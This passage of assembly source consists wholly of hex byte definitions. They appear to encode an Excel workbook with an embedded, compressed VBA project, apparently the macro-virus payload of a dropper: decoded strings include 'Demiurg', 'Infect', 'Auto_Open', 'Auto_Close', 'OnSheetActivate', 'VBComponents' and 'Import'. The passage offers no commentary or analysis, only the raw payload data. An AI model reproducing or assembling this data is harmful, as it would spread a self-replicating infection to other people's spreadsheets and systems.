	db 030h, 000h, 030h, 000h, 030h, 000h, 02Dh, 000h
	db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
	db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
	db 030h, 000h, 030h, 000h, 034h, 000h, 036h, 000h
	db 07Dh, 000h, 023h, 000h, 031h, 000h, 02Eh, 000h
	db 032h, 000h, 023h, 000h, 030h, 000h, 023h, 000h
	db 043h, 000h, 03Ah, 000h, 05Ch, 000h, 050h, 000h
	db 072h, 000h, 06Fh, 000h, 067h, 000h, 072h, 000h
	db 061h, 000h, 06Dh, 000h, 06Dh, 000h, 065h, 000h
	db 05Ch, 000h, 04Dh, 000h, 069h, 000h, 063h, 000h
	db 072h, 000h, 06Fh, 000h, 073h, 000h, 06Fh, 000h
	db 066h, 000h, 074h, 000h, 020h, 000h, 04Fh, 000h
	db 066h, 000h, 066h, 000h, 069h, 000h, 063h, 000h
	db 065h, 000h, 05Ch, 000h, 04Fh, 000h, 066h, 000h
	db 066h, 000h, 069h, 000h, 063h, 000h, 065h, 000h
	db 05Ch, 000h, 045h, 000h, 058h, 000h, 043h, 000h
	db 045h, 000h, 04Ch, 000h, 038h, 000h, 02Eh, 000h
	db 04Fh, 000h, 04Ch, 000h, 042h, 000h, 023h, 000h
	db 04Dh, 000h, 069h, 000h, 063h, 000h, 072h, 000h
	db 06Fh, 000h, 073h, 000h, 06Fh, 000h, 066h, 000h
	db 074h, 000h, 020h, 000h, 045h, 000h, 078h, 000h
	db 063h, 000h, 065h, 000h, 06Ch, 000h, 020h, 000h
	db 038h, 000h, 02Eh, 000h, 030h, 000h, 020h, 000h
	db 04Fh, 000h, 062h, 000h, 06Ah, 000h, 065h, 000h
	db 063h, 000h, 074h, 000h, 020h, 000h, 04Ch, 000h
	db 069h, 000h, 062h, 000h, 072h, 000h, 061h, 000h
	db 072h, 000h, 079h, 0E6h, 00Dh, 000h, 0B8h, 000h
	db 02Ah, 000h, 05Ch, 000h, 047h, 000h, 07Bh, 000h
	db 030h, 000h, 030h, 000h, 030h, 000h, 032h, 000h
	db 030h, 000h, 034h, 000h, 033h, 000h, 030h, 000h
	db 02Dh, 000h, 030h, 000h, 030h, 000h, 030h, 000h
	db 030h, 000h, 02Dh, 000h, 030h, 000h, 030h, 000h
	db 030h, 000h, 030h, 000h, 02Dh, 000h, 043h, 000h
	db 030h, 000h, 030h, 000h, 030h, 000h, 02Dh, 000h
	db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
	db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
	db 030h, 000h, 030h, 000h, 034h, 000h, 036h, 000h
	db 07Dh, 000h, 023h, 000h, 032h, 000h, 02Eh, 000h
	db 030h, 000h, 023h, 000h, 030h, 000h, 023h, 000h
	db 043h, 000h, 03Ah, 000h, 05Ch, 000h, 057h, 000h
	db 049h, 000h, 04Eh, 000h, 044h, 000h, 04Fh, 000h
	db 057h, 000h, 053h, 000h, 05Ch, 000h, 053h, 000h
	db 059h, 000h, 053h, 000h, 054h, 000h, 045h, 000h
	db 04Dh, 000h, 05Ch, 000h, 053h, 000h, 054h, 000h
	db 044h, 000h, 04Fh, 000h, 04Ch, 000h, 045h, 000h
	db 032h, 000h, 02Eh, 000h, 054h, 000h, 04Ch, 000h
	db 042h, 000h, 023h, 000h, 04Fh, 000h, 04Ch, 000h
	db 045h, 000h, 020h, 000h, 041h, 000h, 075h, 000h
	db 074h, 000h, 06Fh, 000h, 06Dh, 000h, 061h, 000h
	db 074h, 000h, 069h, 000h, 06Fh, 000h, 06Eh, 0E6h
	db 00Dh, 000h, 0E0h, 000h, 02Ah, 000h, 05Ch, 000h
	db 047h, 000h, 07Bh, 000h, 036h, 000h, 032h, 000h
	db 041h, 000h, 033h, 000h, 032h, 000h, 043h, 000h
	db 036h, 000h, 032h, 000h, 02Dh, 000h, 041h, 000h
	db 033h, 000h, 036h, 000h, 044h, 000h, 02Dh, 000h
	db 031h, 000h, 031h, 000h, 044h, 000h, 033h, 000h
	db 02Dh, 000h, 041h, 000h, 035h, 000h, 030h, 000h
	db 030h, 000h, 02Dh, 000h, 041h, 000h, 036h, 000h
	db 046h, 000h, 033h, 000h, 044h, 000h, 044h, 000h
	db 041h, 000h, 044h, 000h, 038h, 000h, 032h, 000h
	db 033h, 000h, 039h, 000h, 07Dh, 000h, 023h, 000h
	db 032h, 000h, 02Eh, 000h, 030h, 000h, 023h, 000h
	db 030h, 000h, 023h, 000h, 043h, 000h, 03Ah, 000h
	db 05Ch, 000h, 057h, 000h, 049h, 000h, 04Eh, 000h
	db 044h, 000h, 04Fh, 000h, 057h, 000h, 053h, 000h
	db 05Ch, 000h, 053h, 000h, 059h, 000h, 053h, 000h
	db 054h, 000h, 045h, 000h, 04Dh, 000h, 05Ch, 000h
	db 04Dh, 000h, 053h, 000h, 046h, 000h, 06Fh, 000h
	db 072h, 000h, 06Dh, 000h, 073h, 000h, 02Eh, 000h
	db 054h, 000h, 057h, 000h, 044h, 000h, 023h, 000h
	db 04Dh, 000h, 069h, 000h, 063h, 000h, 072h, 000h
	db 06Fh, 000h, 073h, 000h, 06Fh, 000h, 066h, 000h
	db 074h, 000h, 020h, 000h, 046h, 000h, 06Fh, 000h
	db 072h, 000h, 06Dh, 000h, 073h, 000h, 020h, 000h
	db 032h, 000h, 02Eh, 000h, 030h, 000h, 020h, 000h
	db 04Fh, 000h, 062h, 000h, 06Ah, 000h, 065h, 000h
	db 063h, 000h, 074h, 000h, 020h, 000h, 04Ch, 000h
	db 069h, 000h, 062h, 000h, 072h, 000h, 061h, 000h
	db 072h, 000h, 079h, 0E6h, 00Bh, 000h, 001h, 000h
	db 0E4h, 000h, 02Ah, 000h, 05Ch, 000h, 047h, 000h
	db 07Bh, 000h, 036h, 000h, 032h, 000h, 041h, 000h
	db 033h, 000h, 032h, 000h, 043h, 000h, 036h, 000h
	db 033h, 000h, 02Dh, 000h, 041h, 000h, 033h, 000h
	db 036h, 000h, 044h, 000h, 02Dh, 000h, 031h, 000h
	db 031h, 000h, 044h, 000h, 033h, 000h, 02Dh, 000h
	db 081h, 000h, 000h, 000h, 082h, 000h, 000h, 000h
	db 083h, 000h, 000h, 000h, 084h, 000h, 000h, 000h
	db 085h, 000h, 000h, 000h, 086h, 000h, 000h, 000h
	db 087h, 000h, 000h, 000h, 088h, 000h, 000h, 000h
	db 089h, 000h, 000h, 000h, 08Ah, 000h, 000h, 000h
	db 08Bh, 000h, 000h, 000h, 08Ch, 000h, 000h, 000h
	db 08Dh, 000h, 000h, 000h, 08Eh, 000h, 000h, 000h
	db 08Fh, 000h, 000h, 000h, 090h, 000h, 000h, 000h
	db 091h, 000h, 000h, 000h, 092h, 000h, 000h, 000h
	db 093h, 000h, 000h, 000h, 094h, 000h, 000h, 000h
	db 095h, 000h, 000h, 000h, 096h, 000h, 000h, 000h
	db 097h, 000h, 000h, 000h, 098h, 000h, 000h, 000h
	db 0FEh, 0FFh, 0FFh, 0FFh, 09Ah, 000h, 000h, 000h
	db 09Bh, 000h, 000h, 000h, 09Ch, 000h, 000h, 000h
	db 09Dh, 000h, 000h, 000h, 09Eh, 000h, 000h, 000h
	db 09Fh, 000h, 000h, 000h, 0A0h, 000h, 000h, 000h
	db 0A1h, 000h, 000h, 000h, 0A2h, 000h, 000h, 000h
	db 0A3h, 000h, 000h, 000h, 0A4h, 000h, 000h, 000h
	db 0FEh, 0FFh, 0FFh, 0FFh, 0A6h, 000h, 000h, 000h
	db 0FEh, 0FFh, 0FFh, 0FFh, 0A8h, 000h, 000h, 000h
	db 0A9h, 000h, 000h, 000h, 0AAh, 000h, 000h, 000h
	db 0ABh, 000h, 000h, 000h, 0ACh, 000h, 000h, 000h
	db 0ADh, 000h, 000h, 000h, 0FEh, 0FFh, 0FFh, 0FFh
	db 0AFh, 000h, 000h, 000h, 0B0h, 000h, 000h, 000h
	db 0FEh, 0FFh, 0FFh, 0FFh, 0B2h, 000h, 000h, 000h
	db 0B3h, 000h, 000h, 000h, 0B4h, 000h, 000h, 000h
	db 0B5h, 000h, 000h, 000h, 0B6h, 000h, 000h, 000h
	db 0B7h, 000h, 000h, 000h, 0FEh, 0FFh, 0FFh, 0FFh
	db 0B9h, 000h, 000h, 000h, 0FEh, 0E6h, 0FFh, 0FFh
	db 0E6h, 01Ch, 0FFh, 041h, 000h, 035h, 000h, 030h
	db 000h, 030h, 000h, 02Dh, 000h, 041h, 000h, 036h
	db 000h, 046h, 000h, 033h, 000h, 044h, 000h, 044h
	db 000h, 041h, 000h, 044h, 000h, 038h, 000h, 032h
	db 000h, 033h, 000h, 039h, 000h, 07Dh, 000h, 023h
	db 000h, 032h, 000h, 02Eh, 000h, 030h, 000h, 023h
	db 000h, 030h, 000h, 023h, 000h, 043h, 000h, 03Ah
	db 000h, 05Ch, 000h, 057h, 000h, 049h, 000h, 04Eh
	db 000h, 044h, 000h, 04Fh, 000h, 057h, 000h, 053h
	db 000h, 05Ch, 000h, 054h, 000h, 045h, 000h, 04Dh
	db 000h, 050h, 000h, 05Ch, 000h, 056h, 000h, 042h
	db 000h, 045h, 000h, 05Ch, 000h, 04Dh, 000h, 053h
	db 000h, 046h, 000h, 06Fh, 000h, 072h, 000h, 06Dh
	db 000h, 073h, 000h, 02Eh, 000h, 045h, 000h, 058h
	db 000h, 044h, 000h, 023h, 000h, 04Dh, 000h, 069h
	db 000h, 063h, 000h, 072h, 000h, 06Fh, 000h, 073h
	db 000h, 06Fh, 000h, 066h, 000h, 074h, 000h, 020h
	db 000h, 046h, 000h, 06Fh, 000h, 072h, 000h, 06Dh
	db 000h, 073h, 000h, 020h, 000h, 032h, 000h, 02Eh
	db 000h, 030h, 000h, 020h, 000h, 04Fh, 000h, 062h
	db 000h, 06Ah, 000h, 065h, 000h, 063h, 000h, 074h
	db 000h, 020h, 000h, 04Ch, 000h, 069h, 000h, 062h
	db 000h, 072h, 000h, 061h, 000h, 072h, 000h, 079h
	db 0E6h, 00Bh, 000h, 001h, 000h, 000h, 000h, 0E1h
	db 02Eh, 045h, 00Dh, 08Fh, 0E0h, 01Ah, 010h, 085h
	db 02Eh, 002h, 060h, 08Ch, 04Dh, 00Bh, 0B4h, 000h
	db 000h, 004h, 001h, 02Ah, 000h, 05Ch, 000h, 047h
	db 000h, 07Bh, 000h, 032h, 000h, 044h, 000h, 046h
	db 000h, 038h, 000h, 044h, 000h, 030h, 000h, 034h
	db 000h, 043h, 000h, 02Dh, 000h, 035h, 000h, 042h
	db 000h, 046h, 000h, 041h, 000h, 02Dh, 000h, 031h
	db 000h, 030h, 000h, 031h, 000h, 042h, 000h, 02Dh
	db 000h, 042h, 000h, 044h, 000h, 045h, 000h, 035h
	db 000h, 02Dh, 000h, 030h, 000h, 030h, 000h, 041h
	db 000h, 041h, 000h, 030h, 000h, 030h, 000h, 034h
	db 000h, 034h, 000h, 044h, 000h, 045h, 000h, 035h
	db 000h, 032h, 000h, 07Dh, 000h, 023h, 000h, 032h
	db 000h, 02Eh, 000h, 030h, 000h, 023h, 000h, 030h
	db 000h, 023h, 000h, 043h, 000h, 03Ah, 000h, 05Ch
	db 000h, 050h, 000h, 052h, 000h, 04Fh, 000h, 047h
	db 000h, 052h, 000h, 041h, 000h, 04Dh, 000h, 04Dh
	db 000h, 045h, 000h, 05Ch, 000h, 04Dh, 000h, 049h
	db 000h, 043h, 000h, 052h, 000h, 04Fh, 000h, 053h
	db 000h, 04Fh, 000h, 046h, 000h, 054h, 000h, 020h
	db 000h, 04Fh, 000h, 046h, 000h, 046h, 000h, 049h
	db 000h, 043h, 000h, 045h, 000h, 05Ch, 000h, 04Fh
	db 000h, 046h, 000h, 046h, 000h, 049h, 000h, 043h
	db 000h, 045h, 000h, 05Ch, 000h, 04Dh, 000h, 053h
	db 000h, 04Fh, 000h, 039h, 000h, 037h, 000h, 02Eh
	db 000h, 044h, 000h, 04Ch, 000h, 04Ch, 000h, 023h
	db 000h, 04Dh, 000h, 069h, 000h, 063h, 000h, 072h
	db 000h, 06Fh, 000h, 073h, 000h, 06Fh, 000h, 066h
	db 000h, 074h, 000h, 020h, 000h, 04Fh, 000h, 066h
	db 000h, 066h, 000h, 069h, 000h, 063h, 000h, 065h
	db 000h, 020h, 000h, 038h, 000h, 02Eh, 000h, 030h
	db 000h, 020h, 000h, 04Fh, 000h, 062h, 000h, 06Ah
	db 000h, 065h, 000h, 063h, 000h, 074h, 000h, 020h
	db 000h, 04Ch, 000h, 069h, 000h, 062h, 000h, 072h
	db 000h, 061h, 000h, 072h, 000h, 079h, 0E6h, 00Dh
	db 000h, 003h, 000h, 002h, 000h, 002h, 000h, 001h
	db 000h, 003h, 000h, 004h, 002h, 000h, 000h, 006h
	db 002h, 001h, 000h, 008h, 002h, 000h, 000h, 010h
	db 002h, 0E6h, 006h, 0FFh, 0E6h, 004h, 000h, 0FFh
	db 0FFh, 000h, 000h, 0E8h, 005h, 0C0h, 038h, 003h
	db 000h, 0E6h, 00Ah, 0FFh, 000h, 000h, 001h, 000h
	db 0E6h, 026h, 0FFh, 002h, 000h, 0E6h, 00Ah, 0FFh
	db 001h, 0E6h, 013h, 000h, 0B5h, 031h, 003h, 000h
	db 022h, 000h, 044h, 000h, 069h, 000h, 065h, 000h
	db 073h, 000h, 065h, 000h, 041h, 000h, 072h, 000h
	db 062h, 000h, 065h, 000h, 069h, 000h, 074h, 000h
	db 073h, 000h, 06Dh, 000h, 061h, 000h, 070h, 000h
	db 070h, 000h, 065h, 000h, 00Ah, 000h, 034h, 033h
	db 038h, 063h, 030h, 030h, 035h, 065h, 038h, 000h
	db 003h, 000h, 02Ah, 044h, 001h, 015h, 002h, 0FFh
	db 0FFh, 0B7h, 031h, 0E6h, 007h, 000h, 002h, 000h
	db 000h, 000h, 01Fh, 003h, 000h, 000h, 0FFh, 0FFh
	db 010h, 000h, 054h, 000h, 061h, 000h, 062h, 000h
	db 065h, 000h, 06Ch, 000h, 06Ch, 000h, 065h, 000h
	db 031h, 000h, 00Ah, 000h, 035h, 033h, 038h, 063h
	db 030h, 030h, 035h, 065h, 038h, 000h, 003h, 000h
	db 02Ah, 044h, 001h, 019h, 002h, 0FFh, 0FFh, 0B9h
	db 031h, 0E6h, 006h, 000h, 018h, 002h, 000h, 000h
	db 000h, 01Fh, 003h, 000h, 000h, 0FFh, 0FFh, 00Eh
	db 000h, 044h, 000h, 065h, 000h, 06Dh, 000h, 069h
	db 000h, 075h, 000h, 072h, 000h, 067h, 000h, 00Ah
	db 000h, 064h, 033h, 038h, 063h, 030h, 030h, 035h
	db 066h, 036h, 000h, 003h, 000h, 02Ah, 044h, 001h
	db 01Ch, 002h, 0FFh, 0FFh, 0BBh, 031h, 0E6h, 006h
	db 000h, 030h, 002h, 000h, 000h, 000h, 0B7h, 005h
	db 000h, 000h, 0E6h, 006h, 0FFh, 001h, 001h, 050h
	db 002h, 000h, 000h, 0E6h, 0D8h, 0FFh, 000h, 002h
	db 000h, 000h, 0E6h, 004h, 0FFh, 018h, 002h, 000h
	db 000h, 0E6h, 004h, 0FFh, 030h, 002h, 000h, 000h
	db 0E6h, 0FFh, 0FFh, 0E6h, 015h, 0FFh, 0E7h, 06Eh
	db 0E4h, 0D9h, 03Ah, 0F1h, 0D3h, 011h, 0A5h, 001h
	db 0A6h, 0F3h, 0DDh, 0ADh, 082h, 039h, 0E6h, 004h
	db 0FFh, 001h, 000h, 000h, 000h, 0E9h, 06Eh, 0E4h
	db 0D9h, 03Ah, 0F1h, 0D3h, 011h, 0A5h, 001h, 0A6h
	db 0F3h, 0DDh, 0ADh, 082h, 039h, 0E6h, 004h, 0FFh
	db 001h, 000h, 000h, 000h, 0EBh, 06Eh, 0E4h, 0D9h
	db 03Ah, 0F1h, 0D3h, 011h, 0A5h, 001h, 0A6h, 0F3h
	db 0DDh, 0ADh, 082h, 039h, 0E6h, 004h, 0FFh, 001h
	db 000h, 000h, 000h, 0E6h, 004h, 0FFh, 030h, 000h
	db 000h, 000h, 080h, 0E6h, 005h, 000h, 020h, 001h
	db 021h, 000h, 0FFh, 000h, 0B8h, 028h, 000h, 000h
	db 005h, 004h, 045h, 078h, 063h, 065h, 06Ch, 080h
	db 02Bh, 010h, 000h, 003h, 004h, 056h, 042h, 041h
	db 0F7h, 0E2h, 010h, 000h, 005h, 004h, 057h, 069h
	db 06Eh, 031h, 036h, 0C1h, 07Eh, 010h, 000h, 005h
	db 004h, 057h, 069h, 06Eh, 033h, 032h, 007h, 07Fh
	db 010h, 000h, 003h, 004h, 04Dh, 061h, 063h, 0B3h
	db 0B2h, 010h, 000h, 008h, 004h, 050h, 072h, 06Fh
	db 06Ah, 065h, 06Bh, 074h, 031h, 0D2h, 041h, 010h
	db 000h, 006h, 004h, 073h, 074h, 064h, 06Fh, 06Ch
	db 065h, 093h, 060h, 010h, 000h, 007h, 000h, 04Dh
	db 053h, 046h, 06Fh, 072h, 06Dh, 073h, 043h, 00Fh
	db 010h, 000h, 00Ah, 004h, 056h, 042h, 041h, 050h
	db 072h, 06Fh, 06Ah, 065h, 063h, 074h, 0BEh, 0BFh
	db 010h, 000h, 006h, 004h, 04Fh, 066h, 066h, 069h
	db 063h, 065h, 015h, 075h, 010h, 000h, 011h, 004h
	db 044h, 069h, 065h, 073h, 065h, 041h, 072h, 062h
	db 065h, 069h, 074h, 073h, 06Dh, 061h, 070h, 070h
	db 065h, 0AFh, 081h, 010h, 000h, 009h, 080h, 000h
	db 000h, 0FFh, 003h, 001h, 000h, 05Fh, 045h, 076h
	db 061h, 06Ch, 075h, 061h, 074h, 065h, 018h, 0D9h
	db 010h, 000h, 008h, 004h, 054h, 061h, 062h, 065h
	db 06Ch, 06Ch, 065h, 031h, 052h, 08Ah, 010h, 000h
	db 006h, 004h, 04Dh, 06Fh, 064h, 075h, 06Ch, 031h
	db 0CDh, 01Eh, 010h, 000h, 007h, 004h, 044h, 065h
	db 06Dh, 069h, 075h, 072h, 067h, 01Dh, 017h, 010h
	db 000h, 009h, 004h, 041h, 075h, 074h, 06Fh, 05Fh
	db 04Fh, 070h, 065h, 06Eh, 056h, 020h, 010h, 000h
	db 00Bh, 000h, 041h, 070h, 070h, 06Ch, 069h, 063h
	db 061h, 074h, 069h, 06Fh, 06Eh, 0A5h, 02Ah, 010h
	db 000h, 00Fh, 000h, 04Fh, 06Eh, 053h, 068h, 065h
	db 065h, 074h, 041h, 063h, 074h, 069h, 076h, 061h
	db 074h, 065h, 0FAh, 06Eh, 010h, 000h, 00Ah, 004h
	db 041h, 075h, 074h, 06Fh, 05Fh, 043h, 06Ch, 06Fh
	db 073h, 065h, 077h, 080h, 010h, 000h, 00Ch, 000h
	db 041h, 063h, 074h, 069h, 076h, 065h, 057h, 069h
	db 06Eh, 064h, 06Fh, 077h, 0C3h, 02Bh, 010h, 000h
	db 007h, 000h, 056h, 069h, 073h, 069h, 062h, 06Ch
	db 065h, 0B6h, 0D3h, 010h, 000h, 006h, 004h, 049h
	db 06Eh, 066h, 065h, 063h, 074h, 0E8h, 066h, 010h
	db 000h, 00Dh, 000h, 044h, 069h, 073h, 070h, 06Ch
	db 061h, 079h, 041h, 06Ch, 065h, 072h, 074h, 073h
	db 0F4h, 0F6h, 010h, 000h, 008h, 000h, 06Ch, 061h
	db 073h, 074h, 063h, 068h, 061h, 072h, 013h, 09Ah
	db 010h, 000h, 003h, 000h, 041h, 073h, 063h, 021h
	db 075h, 010h, 000h, 00Eh, 000h, 041h, 063h, 074h
	db 069h, 076h, 065h, 057h, 06Fh, 072h, 06Bh, 062h
	db 06Fh, 06Fh, 06Bh, 013h, 0A2h, 010h, 000h, 001h
	db 000h, 069h, 060h, 010h, 010h, 000h, 009h, 000h
	db 056h, 042h, 050h, 072h, 06Fh, 06Ah, 065h, 063h
	db 074h, 04Fh, 068h, 010h, 000h, 00Ch, 000h, 056h
	db 042h, 043h, 06Fh, 06Dh, 070h, 06Fh, 06Eh, 065h
	db 06Eh, 074h, 073h, 00Ah, 027h, 010h, 000h, 005h
	db 000h, 063h, 06Fh, 075h, 06Eh, 074h, 030h, 076h
	db 010h, 000h, 006h, 000h, 049h, 06Dh, 070h, 06Fh
	db 072h, 074h, 069h, 0C5h, 010h, 000h, 004h, 000h
	db 053h, 061h, 076h, 065h, 092h, 0D0h, 010h, 000h
	db 008h, 004h, 057h, 06Fh, 072h, 06Bh, 062h, 06Fh
	db 06Fh, 06Bh, 06Bh, 018h, 010h, 000h, 002h, 0FFh
	db 0FFh, 001h, 001h, 06Ch, 000h, 000h, 000h, 01Dh
	db 002h, 002h, 000h, 010h, 000h, 0E6h, 012h, 0FFh
	db 000h, 002h, 001h, 000h, 0FFh, 0FFh, 002h, 002h
	db 000h, 000h, 0E6h, 01Ah, 0FFh, 00Ch, 002h, 002h
	db 000h, 0FFh, 0FFh, 00Eh, 002h, 003h, 000h, 0FFh
	db 0FFh, 010h, 002h, 0E6h, 004h, 0FFh, 012h, 002h
	db 004h, 000h, 0FFh, 0FFh, 015h, 002h, 000h, 000h
	db 00Eh, 000h, 0E6h, 006h, 0FFh, 019h, 002h, 001h
	db 000h, 00Eh, 000h, 0E6h, 006h, 0FFh, 000h, 000h
	db 012h, 000h, 000h, 000h, 001h, 000h, 036h, 0E6h
	db 060h, 000h, 001h, 0C6h, 0B2h, 080h, 001h, 000h
	db 004h, 000h, 000h, 000h, 001h, 000h, 030h, 02Ah
	db 002h, 002h, 090h, 009h, 000h, 070h, 014h, 006h
	db 048h, 003h, 000h, 082h, 002h, 000h, 064h, 0E4h
	db 004h, 004h, 000h, 00Ah, 000h, 01Ch, 000h, 056h
	db 042h, 041h, 050h, 072h, 06Fh, 06Ah, 065h, 088h
	db 063h, 074h, 005h, 000h, 034h, 000h, 000h, 040h
	db 002h, 014h, 06Ah, 006h, 002h, 00Ah, 03Dh, 002h
	db 00Ah, 007h, 002h, 072h, 001h, 014h, 008h, 005h
	db 006h, 012h, 009h, 002h, 012h, 0E8h, 005h, 0C0h
	db 038h, 003h, 094h, 000h, 00Ch, 002h, 04Ah, 03Ch
	db 002h, 00Ah, 016h, 000h, 001h, 072h, 080h, 073h
	db 074h, 064h, 06Fh, 06Ch, 065h, 03Eh, 002h, 019h
	db 000h, 073h, 000h, 074h, 000h, 064h, 000h, 06Fh
	db 000h, 080h, 06Ch, 000h, 065h, 000h, 00Dh, 000h
	db 066h, 000h, 025h, 002h, 05Ch, 000h, 003h, 02Ah
	db 05Ch, 047h, 07Bh, 030h, 030h, 080h, 030h, 032h
	db 030h, 034h, 033h, 030h, 02Dh, 000h, 008h, 01Dh
	db 004h, 004h, 043h, 000h, 00Ah, 002h, 00Eh, 001h
	db 012h, 030h, 030h, 034h, 000h, 036h, 07Dh, 023h
	db 032h, 02Eh, 030h, 023h, 030h, 000h, 023h, 043h
	db 03Ah, 05Ch, 057h, 049h, 04Eh, 044h, 000h, 04Fh
	db 057h, 053h, 05Ch, 053h, 059h, 053h, 054h, 000h
	db 045h, 04Dh, 05Ch, 053h, 054h, 044h, 04Fh, 04Ch
	db 080h, 045h, 032h, 02Eh, 054h, 04Ch, 042h, 023h
	db 000h, 008h, 000h, 020h, 041h, 075h, 074h, 06Fh
	db 06Dh, 061h, 074h, 018h, 069h, 06Fh, 06Eh, 000h
	db 05Eh, 000h, 001h, 016h, 000h, 007h, 001h, 080h
	db 002h, 04Dh, 053h, 046h, 06Fh, 072h, 06Dh, 073h
	db 008h, 03Eh, 000h, 00Eh, 001h, 006h, 000h, 053h
	db 000h, 046h, 001h, 000h, 045h, 072h, 000h, 06Dh
	db 000h, 073h, 000h, 02Fh, 034h, 000h, 07Ah, 080h
	db 009h, 070h, 080h, 001h, 001h, 046h, 036h, 032h
	db 000h, 041h, 033h, 032h, 043h, 036h, 032h, 02Dh
	db 041h, 000h, 033h, 036h, 044h, 02Dh, 031h, 031h
	db 044h, 033h, 000h, 02Dh, 041h, 035h, 030h, 030h
	db 02Dh, 041h, 036h, 000h, 046h, 033h, 044h, 044h
	db 041h, 044h, 038h, 032h, 00Ch, 033h, 039h, 017h
	db 046h, 004h, 033h, 02Eh, 054h, 057h, 044h, 000h
	db 023h, 04Dh, 069h, 063h, 072h, 06Fh, 073h, 06Fh
	db 028h, 066h, 074h, 020h, 002h, 03Dh, 020h, 000h
	db 060h, 020h, 04Fh, 002h, 062h, 001h, 0B0h, 020h
	db 04Ch, 069h, 062h, 072h, 061h, 01Ch, 072h, 079h
	db 000h, 039h, 000h, 001h, 01Eh, 050h, 030h, 000h
	db 090h, 07Dh, 000h, 013h, 072h, 080h, 001h, 008h
	db 050h, 000h, 04Bh, 02Ah, 050h, 080h, 04Ah, 050h
	db 020h, 05Ch, 056h, 042h, 045h, 05Ch, 085h, 028h
	db 045h, 058h, 001h, 0A7h, 028h, 0E1h, 02Eh, 045h
	db 00Dh, 08Fh, 0E0h, 01Ah, 000h, 010h, 085h, 02Eh
	db 002h, 060h, 08Ch, 04Dh, 00Bh, 006h, 0B4h, 041h
	db 094h, 043h, 078h, 04Fh, 066h, 066h, 069h, 063h
	db 005h, 044h, 078h, 04Fh, 040h, 075h, 066h, 000h
	db 069h, 000h, 063h, 015h, 042h, 078h, 08Ch, 0C0h
	db 02Bh, 082h, 0C4h, 02Ch, 032h, 044h, 046h, 000h
	db 038h, 044h, 030h, 034h, 043h, 02Dh, 035h, 042h
	db 000h, 046h, 041h, 02Dh, 031h, 030h, 031h, 042h
	db 02Dh, 090h, 064h, 000h, 069h, 000h, 072h, 0E6h
	db 03Bh, 000h, 008h, 000h, 002h, 000h, 0E6h, 00Ch
	db 0FFh, 0E6h, 024h, 000h, 099h, 000h, 000h, 000h
	db 0CAh, 002h, 0E6h, 006h, 000h, 050h, 000h, 052h
	db 000h, 04Fh, 000h, 04Ah, 000h, 045h, 000h, 043h
	db 000h, 054h, 000h, 077h, 000h, 06Dh, 0E6h, 02Fh
	db 000h, 014h, 000h, 002h, 000h, 0E6h, 00Ch, 0FFh
	db 0E6h, 024h, 000h, 0A5h, 000h, 000h, 000h, 06Bh
	db 0E6h, 007h, 000h, 050h, 000h, 052h, 000h, 04Fh
	db 000h, 04Ah, 000h, 045h, 000h, 043h, 000h, 054h
	db 0E6h, 033h, 000h, 010h, 000h, 002h, 001h, 003h
	db 000h, 000h, 000h, 009h, 000h, 000h, 000h, 0E6h
	db 004h, 0FFh, 0E6h, 024h, 000h, 0A7h, 000h, 000h
	db 000h, 0B8h, 001h, 0E6h, 006h, 000h, 005h, 000h
	db 053h, 000h, 075h, 000h, 06Dh, 000h, 06Dh, 000h
	db 061h, 000h, 072h, 000h, 079h, 000h, 049h, 000h
	db 06Eh, 000h, 066h, 000h, 06Fh, 000h, 072h, 000h
	db 06Dh, 000h, 061h, 000h, 074h, 000h, 069h, 000h
	db 06Fh, 000h, 06Eh, 0E6h, 01Bh, 000h, 028h, 000h
	db 002h, 001h, 0E6h, 004h, 0FFh, 00Ch, 000h, 000h
	db 000h, 0E6h, 004h, 0FFh, 0E6h, 024h, 000h, 0AEh
	db 000h, 000h, 000h, 0B4h, 0E6h, 007h, 000h, 042h
	db 044h, 045h, 035h, 040h, 078h, 041h, 041h, 040h
	db 077h, 00Ah, 034h, 0C0h, 002h, 032h, 008h, 055h
	db 050h, 052h, 04Fh, 047h, 010h, 052h, 041h, 04Dh
	db 04Dh, 000h, 02Bh, 049h, 043h, 052h, 000h, 04Fh
	db 053h, 04Fh, 046h, 054h, 020h, 04Fh, 046h, 020h
	db 046h, 049h, 043h, 045h, 05Ch, 084h, 001h, 04Dh
	db 053h, 080h, 04Fh, 039h, 037h, 02Eh, 044h, 04Ch
	db 04Ch, 048h, 059h, 0A1h, 083h, 022h, 020h, 038h
	db 02Eh, 030h, 092h, 059h, 00Fh, 042h, 0BBh, 008h
	db 003h, 000h, 013h, 0C2h, 001h, 0B5h, 031h, 019h
	db 000h, 002h, 011h, 040h, 027h, 044h, 069h, 065h
	db 073h, 065h, 041h, 000h, 072h, 062h, 065h, 069h
	db 074h, 073h, 06Dh, 061h, 010h, 070h, 070h, 065h
	db 01Ah, 093h, 005h, 032h, 000h, 022h, 00Bh, 041h
	db 00Bh, 040h, 037h, 065h, 080h, 08Ch, 065h, 000h
	db 041h, 000h, 0A8h, 072h, 000h, 062h, 0C0h, 039h
	db 069h, 040h, 0B5h, 073h, 080h, 091h, 088h, 061h
	db 000h, 070h, 040h, 000h, 065h, 000h, 01Ch, 040h
	db 009h, 028h, 000h, 000h, 048h, 042h, 001h, 031h
	db 0C2h, 0C6h, 01Fh, 003h, 058h, 000h, 000h, 01Eh
	db 042h, 002h, 001h, 005h, 02Ch, 042h, 01Fh, 0B7h
	db 022h, 031h, 041h, 013h, 000h, 000h, 02Bh, 0C2h
	db 009h, 019h, 000h, 002h, 008h, 0C0h, 001h, 054h
	db 061h, 062h, 065h, 06Ch, 06Ch, 088h, 065h, 031h
	db 01Ah, 04Ah, 003h, 032h, 000h, 010h, 0C1h, 006h
	db 054h, 000h, 061h, 042h, 01Bh, 06Ch, 042h, 0CFh
	db 031h, 064h, 019h, 0B9h, 005h, 04Ch, 019h, 007h
	db 020h, 009h, 044h, 065h, 06Dh, 069h, 075h, 058h
	db 072h, 067h, 01Ah, 082h, 062h, 084h, 001h, 032h
	db 082h, 062h, 044h, 055h, 0A0h, 019h, 06Dh, 0E0h
	db 01Bh, 075h, 020h, 01Bh, 067h, 030h, 00Ch, 0B7h
	db 0E3h, 0C0h, 082h, 0EDh, 018h, 0BBh, 031h, 021h
	db 060h, 00Ah, 0E5h, 018h, 021h, 015h, 0E6h, 039h
	db 000h, 044h, 069h, 065h, 073h, 065h, 041h, 072h
	db 062h, 065h, 069h, 074h, 073h, 06Dh, 061h, 070h
